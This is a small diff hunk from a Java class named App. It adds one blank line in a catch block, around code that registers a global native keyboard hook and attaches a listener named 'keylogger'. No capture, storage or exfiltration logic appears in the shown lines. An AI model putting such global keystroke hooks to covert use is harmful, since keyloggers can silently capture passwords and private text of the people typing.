@@ -11,6 +11,7 @@ public class App
             GlobalScreen.registerNativeHook();
             GlobalScreen.addNativeKeyListener(keylogger);
         } catch (Exception e) {
+            
             System.exit(1);
         }
     }
